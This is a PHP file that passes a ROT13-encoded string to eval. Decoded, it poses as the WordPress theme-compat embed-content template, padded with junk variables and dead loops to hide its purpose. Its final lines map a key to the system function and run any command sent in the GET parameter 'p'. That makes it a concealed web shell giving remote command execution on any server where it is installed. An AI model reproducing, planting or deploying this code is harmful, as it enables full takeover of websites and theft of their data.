<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbagnvaf gur cbfg rzorq pbagrag grzcyngr cneg
 *
 * Jura n cbfg vf rzorqqrq va na vsenzr, guvf svyr vf hfrq gb perngr gur pbagrag grzcyngr cneg
 * bhgchg vs gur npgvir gurzr qbrf abg vapyhqr na rzorq-pbagrag.cuc grzcyngr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gurzr_Pbzcng
 * @fvapr 4.5.0
 */
?>
	<qvi <?cuc cbfg_pynff( 'jc-rzorq' ); ?>>
		<?cuc
		$guhzoanvy_vq = 0;

		vs ( unf_cbfg_guhzoanvy() ) {
			$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq();
		}

		vs ( 'nggnpuzrag' === trg_cbfg_glcr() && jc_nggnpuzrag_vf_vzntr() ) {
			$guhzoanvy_vq = trg_gur_VQ();
		}

		/**
		 * Svygref gur guhzoanvy vzntr VQ sbe hfr va gur rzorq grzcyngr.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz vag|snyfr $guhzoanvy_vq Nggnpuzrag VQ, be snyfr vs gurer vf abar.
		 */
		$guhzoanvy_vq = nccyl_svygref( 'rzorq_guhzoanvy_vq', $guhzoanvy_vq );

		vs ( $guhzoanvy_vq ) {
			$nfcrpg_engvb = 1;
			$zrnfherzragf = neenl( 1, 1 );
			$vzntr_fvmr   = 'shyy'; // Snyyonpx.

			$zrgn = jc_trg_nggnpuzrag_zrgnqngn( $guhzoanvy_vq );
			vs ( ! rzcgl( $zrgn['fvmrf'] ) ) {
				sbernpu ( $zrgn['fvmrf'] nf $fvmr => $qngn ) {
					vs ( $qngn['urvtug'] > 0 && $qngn['jvqgu'] / $qngn['urvtug'] > $nfcrpg_engvb ) {
						$nfcrpg_engvb = $qngn['jvqgu'] / $qngn['urvtug'];
						$zrnfherzragf = neenl( $qngn['jvqgu'], $qngn['urvtug'] );
						$vzntr_fvmr   = $fvmr;
					}
				}
			}

			/**
			 * Svygref gur guhzoanvy vzntr fvmr sbe hfr va gur rzorq grzcyngr.
			 *
			 * @fvapr 4.4.0
			 * @fvapr 4.5.0 Nqqrq `$guhzoanvy_vq` cnenzrgre.
			 *
			 * @cnenz fgevat $vzntr_fvmr   Guhzoanvy vzntr fvmr.
			 * @cnenz vag    $guhzoanvy_vq Nggnpuzrag VQ.
			 */
			$vzntr_fvmr = nccyl_svygref( 'rzorq_guhzoanvy_vzntr_fvmr', $vzntr_fvmr, $guhzoanvy_vq );

			$funcr = $zrnfherzragf[0] / $zrnfherzragf[1] >= 1.75 ? 'erpgnathyne' : 'fdhner';

			/**
			 * Svygref gur guhzoanvy funcr sbe hfr va gur rzorq grzcyngr.
			 *
			 * Erpgnathyne vzntrf ner fubja nobir gur gvgyr juvyr fdhner vzntrf
			 * ner fubja arkg gb gur pbagrag.
			 *
			 * @fvapr 4.4.0
			 * @fvapr 4.5.0 Nqqrq `$guhzoanvy_vq` cnenzrgre.
			 *
			 * @cnenz fgevat $funcr        Guhzoanvy vzntr funcr. Rvgure 'erpgnathyne' be 'fdhner'.
			 * @cnenz vag    $guhzoanvy_vq Nggnpuzrag VQ.
			 */
			$funcr = nccyl_svygref( 'rzorq_guhzoanvy_vzntr_funcr', $funcr, $guhzoanvy_vq );
		}

		vs ( $guhzoanvy_vq && 'erpgnathyne' === $funcr ) :
			?>
			<qvi pynff=\"jc-rzorq-srngherq-vzntr erpgnathyne\">
				<n uers=\"<?cuc gur_creznyvax(); ?>\" gnetrg=\"_gbc\">
					<?cuc rpub jc_trg_nggnpuzrag_vzntr( $guhzoanvy_vq, $vzntr_fvmr ); ?>
				</n>
			</qvi>
		<?cuc raqvs; ?>

		<c pynff=\"jc-rzorq-urnqvat\">
			<n uers=\"<?cuc gur_creznyvax(); ?>\" gnetrg=\"_gbc\">
				<?cuc gur_gvgyr(); ?>
			</n>
		</c>

		<?cuc vs ( $guhzoanvy_vq && 'fdhner' === $funcr ) : ?>
			<qvi pynff=\"jc-rzorq-srngherq-vzntr fdhner\">
				<n uers=\"<?cuc gur_creznyvax(); ?>\" gnetrg=\"_gbc\">
					<?cuc rpub jc_trg_nggnpuzrag_vzntr( $guhzoanvy_vq, $vzntr_fvmr ); ?>
				</n>
			</qvi>
		<?cuc raqvs; ?>

		<qvi pynff=\"jc-rzorq-rkprecg\"><?cuc gur_rkprecg_rzorq(); ?></qvi>

		<?cuc
		/**
		 * Cevagf nqqvgvbany pbagrag nsgre gur rzorq rkprecg.
		 *
		 * @fvapr 4.4.0
		 */
		qb_npgvba( 'rzorq_pbagrag' );
		?>

		<qvi pynff=\"jc-rzorq-sbbgre\">
			<?cuc gur_rzorq_fvgr_gvgyr(); ?>

			<qvi pynff=\"jc-rzorq-zrgn\">
				<?cuc
				/**
				 * Cevagf nqqvgvbany zrgn pbagrag va gur rzorq grzcyngr.
				 *
				 * @fvapr 4.4.0
				 */
				qb_npgvba( 'rzorq_pbagrag_zrgn' );
				?>
			</qvi>
		</qvi>
	</qvi>
<?cuc

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>